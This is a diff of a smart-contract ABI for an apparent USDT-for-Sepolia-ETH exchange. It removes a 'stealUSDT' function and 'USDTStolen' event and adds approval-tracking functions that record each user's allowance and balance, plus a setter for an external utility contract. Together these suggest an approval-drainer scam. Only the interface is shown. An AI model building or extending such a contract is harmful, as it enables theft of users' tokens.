@@ -2,19 +2,6 @@
 	{
 		"inputs": [
 			{
-				"internalType": "uint256",
-				"name": "usdtAmount",
-				"type": "uint256"
-			}
-		],
-		"name": "buySepoliaETH",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
 				"internalType": "address",
 				"name": "_usdt",
 				"type": "address"
@@ -49,56 +36,6 @@
 		"type": "event"
 	},
 	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "user",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "stealUSDT",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "newOwner",
-				"type": "address"
-			}
-		],
-		"name": "transferOwnership",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"anonymous": false,
-		"inputs": [
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "user",
-				"type": "address"
-			},
-			{
-				"indexed": false,
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "USDTStolen",
-		"type": "event"
-	},
-	{
 		"anonymous": false,
 		"inputs": [
 			{
@@ -118,16 +55,87 @@
 		"type": "event"
 	},
 	{
+		"anonymous": false,
 		"inputs": [
 			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "ZWHRecord",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "MAX_WITHDRAW_PER_DAY",
+		"outputs": [
+			{
 				"internalType": "uint256",
-				"name": "amount",
+				"name": "",
 				"type": "uint256"
 			}
 		],
-		"name": "withdrawUSDT",
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "PRICE",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"name": "authorizedUsers",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "usdtAmount",
+				"type": "uint256"
+			}
+		],
+		"name": "buySepoliaETH",
 		"outputs": [],
 		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "getAuthorizedUsers",
+		"outputs": [
+			{
+				"internalType": "address[]",
+				"name": "",
+				"type": "address[]"
+			}
+		],
+		"stateMutability": "view",
 		"type": "function"
 	},
 	{
@@ -144,13 +152,43 @@
 		"type": "function"
 	},
 	{
-		"inputs": [],
-		"name": "MAX_WITHDRAW_PER_DAY",
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "getUserAuthorization",
 		"outputs": [
 			{
 				"internalType": "uint256",
-				"name": "",
+				"name": "allowance",
 				"type": "uint256"
+			},
+			{
+				"internalType": "uint256",
+				"name": "balance",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"name": "hasAuthorized",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
 			}
 		],
 		"stateMutability": "view",
@@ -171,15 +209,54 @@
 	},
 	{
 		"inputs": [],
-		"name": "PRICE",
+		"name": "register",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"name": "registeredUsers",
 		"outputs": [
 			{
-				"internalType": "uint256",
+				"internalType": "bool",
 				"name": "",
-				"type": "uint256"
+				"type": "bool"
 			}
 		],
 		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_util",
+				"type": "address"
+			}
+		],
+		"name": "setZWHUtil",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "transferOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
 		"type": "function"
 	},
 	{
@@ -188,6 +265,32 @@
 		"outputs": [
 			{
 				"internalType": "contract IERC20",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "withdrawUSDT",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "zwhUtil",
+		"outputs": [
+			{
+				"internalType": "address",
 				"name": "",
 				"type": "address"
 			}
